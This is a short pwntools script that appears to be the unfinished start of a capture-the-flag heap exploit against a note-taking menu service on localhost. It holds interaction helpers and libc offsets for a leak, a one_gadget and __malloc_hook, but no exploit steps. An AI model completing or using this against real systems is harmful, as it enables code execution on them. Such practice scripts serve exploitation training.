#! /usr/bin/env python
from pwn import *


def new(size, content):
    io.sendafter("choice> ", "1")
    io.sendafter("size: ", str(size))
    io.sendafter("content: ", content)

def print_note(index):
    io.sendafter("choice> ", "2")
    io.sendafter("index: ", str(index))
    return io.recvline()

def edit_note(index, length, content):
    io.sendafter("choice> ", "3")
    io.sendafter("index: ", str(index))
    io.sendafter("length: ", str(length))
    io.sendafter("content: ", str(content))

def delete_note(index):
    io.sendafter("choice> ", "4")
    io.sendafter("index: ", str(index))

io = remote("localhost", 8888)

# libc
leak_offset = 0x3c38e0
onegadget_offset = 0xef6c4
malloc_hook_offset = 0x3c3b10



io.interactive()
